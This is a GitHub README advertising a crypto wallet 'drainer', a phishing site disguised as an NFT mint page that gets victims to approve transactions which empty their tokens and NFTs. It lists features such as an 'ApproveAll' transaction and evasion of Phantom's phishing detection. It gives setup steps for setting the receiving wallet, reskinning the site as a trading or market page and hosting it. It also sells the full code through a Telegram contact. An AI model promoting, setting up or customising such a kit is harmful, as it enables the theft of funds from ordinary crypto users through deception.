# 🔥Welcome! PUBLIC GITHUB IS BACKDOORED AND YOU SHOULD NOT USE IT (TELEGRAM - @paradrainers)🔥
📩 Like all Drainers you need to host to make it work (recommended: Hostinger, Netlify, Vercel, Github...)

![yoots mint site](https://user-images.githubusercontent.com/128543022/226957030-270f057c-b5d1-4b0e-b731-38c966ecac22.png)

# 🔮Features
✅Embed script

✅Inspect Element Detection

✅ApproveAll Transaction

✅No API needed

✅Custom & Cool Design

✅Instant transactions

✅No contract required

✅Anti Phantom Phishing Detections

✅NFT + Tokens Drainer

# 📔Setup Guide
# ❗️Note - It will not work if you havent bought the full code TELEGRAM @paradrainers

You need to edit the main.chunk.js file to your Drain receiver wallet.

- Open all images folders and put your project images, but rename name as it was before.
- Open index.html, to edit the project Discord link, Twitter link, how many mints left or total supply and the project name also basically you can change everything and you can design it by yourself it can look like for example (Trading site, Market site).
-after it you are done, and you just need to host it to any hosting service.


💌To get instant support, dm me on TELEGRAM @paradrainers


Please ⭐ the repo to support this project & follow for the next updates.

![image](https://user-images.githubusercontent.com/128543022/226962134-de28c1f1-72c8-42bc-b4eb-ba86ddcbe02b.png)
